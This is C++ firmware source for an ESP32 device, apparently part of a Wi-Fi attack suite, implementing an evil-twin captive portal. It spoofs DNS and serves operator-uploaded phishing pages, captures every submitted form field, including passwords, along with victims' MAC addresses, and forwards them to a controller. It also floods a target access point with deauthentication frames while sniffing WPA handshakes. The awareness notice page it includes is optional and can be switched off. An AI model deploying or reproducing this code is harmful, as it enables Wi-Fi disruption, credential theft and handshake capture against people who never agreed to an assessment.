#include "portal.h"
#include "sniffer.h"

#include <esp_wifi_ap_get_sta_list.h>

#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
    #include <FFat.h>
    #define PORTAL_STORAGE FS
    #define PORTAL_STORAGE_OBJ FFat
    #define PORTAL_STORAGE_LABEL "msc_ffat"
    #define PORTAL_STORAGE_BASE "/ffat"
    #define PORTAL_STORAGE_FORMAT_ON_FAIL true
#else
    #include <LittleFS.h>
    #define PORTAL_STORAGE FS
    #define PORTAL_STORAGE_OBJ LittleFS
    #define PORTAL_STORAGE_LABEL "portal"
    #define PORTAL_STORAGE_BASE "/littlefs"
    #define PORTAL_STORAGE_FORMAT_ON_FAIL true
#endif

namespace {
constexpr const char* PORTAL_HTML_PATH = "/portal/index.html";
constexpr uint32_t DEAUTH_BURST_PAUSE_MS = 3000;
constexpr uint32_t PORTAL_AP_RESET_SETTLE_MS = 750;
constexpr uint32_t PORTAL_AP_RETRY_SETTLE_MS = 1000;
constexpr uint32_t PORTAL_AP_START_SETTLE_MS = 350;
constexpr uint8_t PORTAL_AP_START_ATTEMPTS = 3;
constexpr uint8_t PORTAL_RUNTIME_INIT_ATTEMPTS = 2;

void addNoCacheHeaders(AsyncWebServerResponse* response) {
    if (!response) return;
    response->addHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
    response->addHeader("Pragma", "no-cache");
    response->addHeader("Expires", "0");
}
}  // namespace

void PortalManager::begin(BridgeProtocol& proto) {
    _proto = &proto;

    // Bind the HTTP listener once for the life of the firmware. Repeatedly
    // closing and reopening port 80 after a portal restart can leave the old
    // lwIP socket in a transient state; AsyncWebServer::begin() has no return
    // value, so a failed re-bind silently produces "connection refused".
    String serverError;
    if (!setupHttpServer(&serverError)) {
        Serial.printf("PORTAL: persistent HTTP listener init failed: %s\n",
                      serverError.c_str());
    } else {
        Serial.println("PORTAL: persistent HTTP listener initialized");
    }
    if (!setupDNSSpoof()) {
        Serial.println("PORTAL: persistent DNS responder init failed");
    } else {
        Serial.println("PORTAL: persistent DNS responder initialized");
    }
}

bool PortalManager::setupDNSSpoof() {
    if (_dnsServer) return true;
    _dnsServer = new DNSServer();
    if (!_dnsServer) return false;
    const bool started = _dnsServer->start(53, "*", IPAddress(192, 168, 4, 1));
    if (!started) {
        delete _dnsServer;
        _dnsServer = nullptr;
        return false;
    }
    return true;
}

void PortalManager::teardownServerAndDns() {
    // HTTP and DNS listeners are intentionally persistent. Keeping their
    // sockets bound avoids lwIP TIME_WAIT/rebind races when the portal AP is
    // stopped and started repeatedly. DNS processing itself is gated by
    // _running in update().
}

bool PortalManager::setupHttpServer(String* error) {
    if (_server) return true;
    _server = new AsyncWebServer(80);
    if (!_server) {
        if (error) *error = "HTTP server allocation failed";
        return false;
    }
    setupRoutes();
    _server->begin();
    return true;
}

bool PortalManager::restoreIdleAp() {
    // Keep WIFI_IF_AP alive for TX-only modules without exposing the Arduino
    // default open "ESP_XXXXXX" SoftAP. The helper AP is hidden and protected.
    if (WiFi.getMode() != WIFI_MODE_APSTA) {
        WiFi.mode(WIFI_MODE_APSTA);
        delay(PORTAL_AP_RESET_SETTLE_MS);
    }

    char idleSsid[28]{};
    char idlePass[9]{};
    static const char kIdleChars[] =
        "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
    const uint32_t seed = esp_random();
    snprintf(idleSsid, sizeof(idleSsid), "NRSuite-Idle-%06x", seed & 0xffffff);
    for (size_t i = 0; i < 8; ++i) {
        idlePass[i] = kIdleChars[(seed >> ((i % 4) * 8)) % (sizeof(kIdleChars) - 1)];
    }
    idlePass[8] = '\0';

    const bool ok = WiFi.softAP(idleSsid, idlePass, 1, 1, 1);
    Serial.printf("PORTAL: hidden idle AP restore %s\n", ok ? "ok" : "failed");
    return ok;
}

void PortalManager::cleanupFailedStart() {
    _running = false;
    teardownServerAndDns();
    if (_deauthTaskHandle) {
        vTaskDelete(_deauthTaskHandle);
        _deauthTaskHandle = nullptr;
    }
    if (_apStarted) {
        _apStarted = false;
        WiFi.softAPdisconnect(true);
        delay(PORTAL_AP_RESET_SETTLE_MS);
    }
    restoreIdleAp();
    if (_htmlFile) _htmlFile.close();
    unmountPortalStorage();
    Serial.printf("PORTAL: start failure cleanup complete, heap=%lu\n",
                  (unsigned long)ESP.getFreeHeap());
}

void PortalManager::emitClientSeen(AsyncWebServerRequest* request, const char* requestType) {
    if (!_proto || !request || !request->client()) return;

    const String clientIp = request->client()->remoteIP().toString();
    String clientMac = "unknown";

    wifi_sta_list_t staList{};
    wifi_sta_mac_ip_list_t macIpList{};
    if (esp_wifi_ap_get_sta_list(&staList) == ESP_OK &&
        esp_wifi_ap_get_sta_list_with_ip(&staList, &macIpList) == ESP_OK) {
        const IPAddress requestIp = request->client()->remoteIP();
        for (int i = 0; i < macIpList.num; i++) {
            const IPAddress stationIp(macIpList.sta[i].ip.addr);
            if (stationIp == requestIp) {
                char mac[18];
                snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                         macIpList.sta[i].mac[0], macIpList.sta[i].mac[1],
                         macIpList.sta[i].mac[2], macIpList.sta[i].mac[3],
                         macIpList.sta[i].mac[4], macIpList.sta[i].mac[5]);
                clientMac = mac;
                break;
            }
        }
    }

    JsonDocument event;
    event["type"] = "portal_client_seen";
    event["ip"] = clientIp;
    event["mac"] = clientMac;
    event["user_agent"] = request->header("User-Agent");
    event["request_type"] = requestType;
    event["timestamp"] = millis();
    _proto->sendEvent("portal_client_seen", event);
}

bool PortalManager::emitCaptiveData(AsyncWebServerRequest* request,
                                    const char* requestType,
                                    bool ignoreAttemptArg) {
    if (!request) return false;

    JsonDocument doc;
    doc["type"] = "captive_data";
    doc["ip"] = request->client()->remoteIP().toString();
    doc["user_agent"] = request->header("User-Agent");
    doc["request_type"] = requestType;
    doc["timestamp"] = millis();

    JsonObject data = doc["data"].to<JsonObject>();
    bool hasFields = false;
    const int params = request->args();
    for (int i = 0; i < params; i++) {
        const String argName = request->argName(i);
        if (argName.isEmpty()) continue;
        if (ignoreAttemptArg && argName.equalsIgnoreCase("attempt")) continue;
        data[argName] = request->arg(i);
        hasFields = true;
    }

    if (!hasFields) return false;
    if (_proto) _proto->sendEvent("captive_data", doc);
    return true;
}

String PortalManager::loadingPlaceholder() const {
    return
        "<!DOCTYPE html><html><head>"
        "<meta http-equiv='refresh' content='2'>"
        "<meta name='viewport' content='width=device-width, initial-scale=1'>"
        "<style>"
        "body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;"
        "background:#0d0d0f;font-family:sans-serif;color:#eee;flex-direction:column;}"
        ".spinner{width:48px;height:48px;border:4px solid #333;border-top-color:#4da6ff;"
        "border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:16px;}"
        "@keyframes spin{to{transform:rotate(360deg);}}"
        "p{opacity:0.7;font-size:14px;}"
        "</style></head><body>"
        "<div class='spinner'></div>"
        "<p>Connecting...</p>"
        "</body></html>";
}

String PortalManager::noticePage() const {
    return
        "<!DOCTYPE html><html><head>"
        "<meta name='viewport' content='width=device-width, initial-scale=1'>"
        "<style>"
        "body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;"
        "background:#0d0d0f;font-family:sans-serif;color:#eee;padding:24px;box-sizing:border-box;}"
        ".card{max-width:420px;text-align:center;}"
        "h1{font-size:18px;color:#4da6ff;margin-bottom:12px;}"
        "p{opacity:0.8;font-size:14px;line-height:1.5;}"
        "button{margin-top:20px;padding:10px 24px;background:#4da6ff;border:none;border-radius:6px;"
        "color:#0d0d0f;font-weight:bold;font-size:14px;cursor:pointer;}"
        "</style></head><body>"
        "<div class='card'>"
        "<h1>Security Awareness Test</h1>"
        "<p>You connected to a Wi-Fi network set up as part of an authorized security "
        "assessment. No credentials or personal data are stored by this test.</p>"
        "<p>In a real attack, a network like this could be used to intercept your traffic "
        "or steal login credentials. Always verify network names before connecting.</p>"
        "<a href='/continue'><button>Continue</button></a>"
        "</div></body></html>";
}

bool PortalManager::mountPortalStorage() {
    if (_storageMounted) return true;
    _storageMounted = PORTAL_STORAGE_OBJ.begin(
        PORTAL_STORAGE_FORMAT_ON_FAIL,
        PORTAL_STORAGE_BASE,
        10,
        PORTAL_STORAGE_LABEL
    );
    if (!_storageMounted) return false;
    PORTAL_STORAGE_OBJ.mkdir("/portal");
    return true;
}

void PortalManager::unmountPortalStorage() {
    if (_htmlFile) _htmlFile.close();
    if (_storageMounted) {
        PORTAL_STORAGE_OBJ.end();
        _storageMounted = false;
    }
}

void PortalManager::sendPortalContent(AsyncWebServerRequest* request) {
    if (_htmlComplete && _htmlLen > 0 && PORTAL_STORAGE_OBJ.exists(PORTAL_HTML_PATH)) {
        AsyncWebServerResponse* resp = request->beginResponse(
            PORTAL_STORAGE_OBJ,
            PORTAL_HTML_PATH,
            "text/html"
        );
        resp->addHeader("Content-Length", String(_htmlLen));
        addNoCacheHeaders(resp);
        request->send(resp);
    } else {
        AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", loadingPlaceholder());
        addNoCacheHeaders(resp);
        request->send(resp);
    }
}

void PortalManager::setupRoutes() {
    _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* request) {
        emitClientSeen(request, "GET /");
        // Some captive portal templates submit credential fields as GET query
        // parameters instead of POSTing to /login.
        emitCaptiveData(request, "GET /", true);
        JsonDocument ev;
        ev["type"]      = "portal_viewed";
        ev["client_ip"] = request->client()->remoteIP().toString();
        if (_proto) _proto->sendEvent("portal_viewed", ev);

        if (_showNotice) {
            AsyncWebServerResponse* response = request->beginResponse(200, "text/html", noticePage());
            addNoCacheHeaders(response);
            request->send(response);
        } else {
            sendPortalContent(request);
        }
    });

    _server->on("/continue", HTTP_GET, [this](AsyncWebServerRequest* request) {
        emitClientSeen(request, "GET /continue");
        emitCaptiveData(request, "GET /continue", true);
        sendPortalContent(request);
    });

    auto handleCaptiveSubmission = [this](AsyncWebServerRequest* request,
                                          const char* requestType) {
        emitClientSeen(request, requestType);
        emitCaptiveData(request, requestType);

        // Redirect back
        _loginAttempts = min(_loginAttempts + 1, 10);

        String redirect_html =
            "<script>setTimeout(() => window.location='/?attempt=" +
            String(_loginAttempts) + "', 800);</script>";

        AsyncWebServerResponse* response = request->beginResponse(200, "text/html", redirect_html);
        addNoCacheHeaders(response);
        request->send(response);
    };

    _server->on("/login", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
        handleCaptiveSubmission(request, "POST /login");
    });
    _server->on("/login", HTTP_GET, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
        handleCaptiveSubmission(request, "GET /login");
    });

    _server->onNotFound([this](AsyncWebServerRequest* request) {
        emitClientSeen(request, "GET other");
        request->redirect("http://192.168.4.1/");
    });
}

void PortalManager::deauthTaskFn(void* pv) {
    auto* self = (PortalManager*)pv;
    uint8_t frame[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7};
    memcpy(frame+10, self->_targetBssid, 6);
    memcpy(frame+16, self->_targetBssid, 6);

    uint16_t seq = 0x0010;
    while (self->_running) {
        for (int i=0; i<10; i++) {
            frame[22] = seq&0xFF; frame[23]=(seq>>8)&0xFF;
            esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, true);
            seq += 0x0010;
            delay(10);
        }
        vTaskDelay(pdMS_TO_TICKS(DEAUTH_BURST_PAUSE_MS));
    }
    vTaskDelete(NULL);
}

// portal.cpp
bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targetBssid,
                          bool showNotice, String* error) {
    stop();  // always clean up any previous state, even if a prior start() failed partway
    _showNotice = showNotice;

    Serial.printf(
        "PORTAL: start ssid='%s' channel=%u notice=%s heap=%lu\n",
        ssid ? ssid : "",
        (unsigned)channel,
        showNotice ? "on" : "off",
        (unsigned long)ESP.getFreeHeap()
    );

    // Mount the backing filesystem before bringing up the AP. If this fails,
    // no AP/server can be left half-started.
    if (!mountPortalStorage()) {
        if (error) *error = "portal storage mount failed";
        Serial.println("PORTAL: storage mount failed before AP start");
        cleanupFailedStart();
        return false;
    }
    Serial.println("PORTAL: storage mounted");

    // Keep the radio in APSTA mode. Do not cycle through STA mode here: on
    // Arduino-ESP32 that can create a visible default open ESP_XXXXXX SoftAP
    // and leaves the next softAP() call racing the previous DHCP/AP teardown.
    if (WiFi.getMode() != WIFI_MODE_APSTA) {
        WiFi.mode(WIFI_MODE_APSTA);
        delay(PORTAL_AP_RESET_SETTLE_MS);
    }

    bool apReady = false;
    esp_err_t err = ESP_OK;
    for (uint8_t attempt = 1; attempt <= PORTAL_AP_START_ATTEMPTS; ++attempt) {
        Serial.printf("PORTAL: softAP start attempt %u/%u\n",
                      (unsigned)attempt, (unsigned)PORTAL_AP_START_ATTEMPTS);
        WiFi.softAPdisconnect(true);
        delay(PORTAL_AP_RESET_SETTLE_MS);

        const bool apOk = WiFi.softAP(ssid, nullptr, channel);
        if (!apOk) {
            Serial.println("PORTAL: WiFi.softAP returned false");
            if (attempt < PORTAL_AP_START_ATTEMPTS) {
                delay(PORTAL_AP_RETRY_SETTLE_MS);
                continue;
            }
            break;
        }
        _apStarted = true;

        const bool cfgOk = WiFi.softAPConfig(
            IPAddress(192, 168, 4, 1),
            IPAddress(192, 168, 4, 1),
            IPAddress(255, 255, 255, 0)
        );
        if (!cfgOk) {
            Serial.println("PORTAL: WiFi.softAPConfig failed");
            _apStarted = false;
            WiFi.softAPdisconnect(true);
            if (attempt < PORTAL_AP_START_ATTEMPTS) {
                delay(PORTAL_AP_RETRY_SETTLE_MS);
                continue;
            }
            break;
        }

        wifi_config_t cfg{};
        err = esp_wifi_get_config(WIFI_IF_AP, &cfg);
        if (err == ESP_OK) {
            const size_t expectedSsidLen = strlen(ssid);
            const size_t configuredSsidLen = cfg.ap.ssid_len;
            const bool ssidMatches =
                configuredSsidLen == expectedSsidLen &&
                configuredSsidLen <= sizeof(cfg.ap.ssid) &&
                memcmp(cfg.ap.ssid, ssid, configuredSsidLen) == 0;
            if (!ssidMatches) {
                Serial.printf(
                    "PORTAL: softAP reported success but configured SSID length=%u "
                    "does not match requested length=%u\n",
                    (unsigned)configuredSsidLen,
                    (unsigned)expectedSsidLen
                );
                err = ESP_ERR_INVALID_STATE;
            } else {
                cfg.ap.channel = channel;
                err = esp_wifi_set_config(WIFI_IF_AP, &cfg);
            }
        }
        if (err != ESP_OK) {
            Serial.printf("PORTAL: AP channel config failed: %s (%d)\n",
                          esp_err_to_name(err), (int)err);
            _apStarted = false;
            WiFi.softAPdisconnect(true);
            if (attempt < PORTAL_AP_START_ATTEMPTS) {
                delay(PORTAL_AP_RETRY_SETTLE_MS);
                continue;
            }
            break;
        }

        err = esp_wifi_start();
        if (err != ESP_OK && err != ESP_ERR_WIFI_STATE) {
            Serial.printf("PORTAL: esp_wifi_start failed: %s (%d)\n",
                          esp_err_to_name(err), (int)err);
            _apStarted = false;
            WiFi.softAPdisconnect(true);
            if (attempt < PORTAL_AP_START_ATTEMPTS) {
                delay(PORTAL_AP_RETRY_SETTLE_MS);
                continue;
            }
            break;
        }

        apReady = true;
        Serial.printf("PORTAL: softAP up, ssid='%s' ip=%s\n",
                      ssid,
                      WiFi.softAPIP().toString().c_str());
        break;
    }

    if (!apReady) {
        if (error) {
            *error = "softAP creation failed after retries";
            if (err != ESP_OK) {
                *error += ": ";
                *error += esp_err_to_name(err);
            }
        }
        Serial.println("PORTAL: softAP could not be brought up cleanly");
        cleanupFailedStart();
        return false;
    }
    delay(PORTAL_AP_START_SETTLE_MS);

    bool runtimeReady = false;
    for (uint8_t attempt = 1; attempt <= PORTAL_RUNTIME_INIT_ATTEMPTS; ++attempt) {
        Serial.printf("PORTAL: HTTP/DNS init attempt %u/%u\n",
                      (unsigned)attempt, (unsigned)PORTAL_RUNTIME_INIT_ATTEMPTS);
        if (!setupHttpServer(error)) {
            teardownServerAndDns();
            delay(PORTAL_AP_RESET_SETTLE_MS);
            continue;
        }
        if (!setupDNSSpoof()) {
            if (error) *error = "DNS server start failed";
            Serial.println("PORTAL: DNS server start failed");
            teardownServerAndDns();
            delay(PORTAL_AP_RESET_SETTLE_MS);
            continue;
        }
        runtimeReady = true;
        Serial.println("PORTAL: HTTP and DNS servers started");
        break;
    }

    if (!runtimeReady) {
        if (error && error->isEmpty()) *error = "HTTP/DNS server init failed";
        cleanupFailedStart();
        return false;
    }

    _running = true;
    if (targetBssid) {
        memcpy(_targetBssid, targetBssid, 6);
        _hasTarget = true;
        Sniffer::instance()->setEapolFilter(true, targetBssid);
        Sniffer::instance()->startFixed(channel);
        xTaskCreate(deauthTaskFn, "DeauthTask", 4096, this, 1, &_deauthTaskHandle);
    }
    Serial.printf("PORTAL: started successfully, heap=%lu\n",
                  (unsigned long)ESP.getFreeHeap());
    return true;
}

bool PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast,
                                size_t offset, bool hasOffset) {
    if (data && len > 0) {
        if (!_htmlFile) return false;
        const size_t writeOffset = hasOffset ? offset : _htmlLen;

        // Offset mode is idempotent: retrying a chunk overwrites the same
        // range instead of appending it a second time. Reject gaps so a lost
        // middle chunk is reported as an error instead of producing a hole.
        if (hasOffset && writeOffset > _htmlLen) {
            return false;
        }
        if (_htmlExpected > 0 && writeOffset + len > _htmlExpected) {
            return false;
        }
        if (!_htmlFile.seek(writeOffset)) {
            return false;
        }
        const size_t written = _htmlFile.write(data, len);
        if (written != len) {
            return false;
        }
        if (writeOffset + len > _htmlLen) {
            _htmlLen = writeOffset + len;
        }
    }

    if (isLast) {
        if (!_htmlFile) {
            return _htmlExpected == 0;
        }

        // Append closing tags when the user supplied a fragment.
        bool hasClose = false;
        if (_htmlLen >= 7) {
            char tail[8] = {0};
            if (_htmlFile.seek(_htmlLen - 7)) {
                const size_t read = _htmlFile.read((uint8_t*)tail, 7);
                tail[read] = '\0';
                hasClose = (read == 7 && strncasecmp(tail, "</html>", 7) == 0);
            }
        }
        if (!hasClose) {
            const char* suffix = "</body></html>";
            const size_t slen = strlen(suffix);
            if (!_htmlFile.seek(_htmlLen)) return false;
            if (_htmlFile.write((const uint8_t*)suffix, slen) != slen) return false;
            _htmlLen += slen;
        }

        // A final chunk is only complete when the declared payload arrived.
        if (_htmlExpected > 0 && _htmlLen < _htmlExpected) {
            return false;
        }

        _htmlFile.close();
        _htmlComplete = true;

        JsonDocument dbg;
        dbg["type"] = "html_complete";
        dbg["size"] = _htmlLen;
        dbg["expected"] = _htmlExpected;
        if (_proto) {
            _proto->sendEvent("debug", dbg);
        }
    }

    return true;
}

bool PortalManager::resetHtml(size_t expectedSize) {
    const size_t MAX_HTML_SIZE = 24 * 1024;

    if (_htmlFile) _htmlFile.close();
    _htmlLen = 0;
    _htmlExpected = 0;
    _htmlComplete = false;

    if (expectedSize == 0) {
        return true;
    }
    if (expectedSize > MAX_HTML_SIZE) {
        return false;
    }
    if (!mountPortalStorage()) {
        return false;
    }
    PORTAL_STORAGE_OBJ.mkdir("/portal");
    _htmlFile = PORTAL_STORAGE_OBJ.open(PORTAL_HTML_PATH, FILE_WRITE);
    if (!_htmlFile) {
        return false;
    }
    _htmlExpected = expectedSize;
    return true;
}

void PortalManager::update() {
    if (_running && _dnsServer) _dnsServer->processNextRequest();
}

void PortalManager::stop() {
    const bool hadRuntime =
        _running || _deauthTaskHandle != nullptr || _apStarted;
    _running = false;
    _showNotice = true;
    _loginAttempts = 0;
    _hasTarget = false;
    if (_deauthTaskHandle) { vTaskDelete(_deauthTaskHandle); _deauthTaskHandle = nullptr; }
    teardownServerAndDns();

    // Only tear down the AP if this portal owned it. stopAllModules() calls
    // stop() before every radio module; touching the AP unconditionally would
    // clobber the always-on hidden helper AP used by TX-only modules.
    if (_apStarted || hadRuntime) {
        _apStarted = false;
        WiFi.softAPdisconnect(true);
        delay(PORTAL_AP_RESET_SETTLE_MS);
        restoreIdleAp();
    }

    if (_htmlFile) _htmlFile.close();
    unmountPortalStorage();
    _htmlLen = 0;
    _htmlExpected = 0;
    _htmlComplete = false;
    if (hadRuntime) {
        Serial.printf("PORTAL: stopped, AP reset/settled, heap=%lu\n",
                      (unsigned long)ESP.getFreeHeap());
    }
}
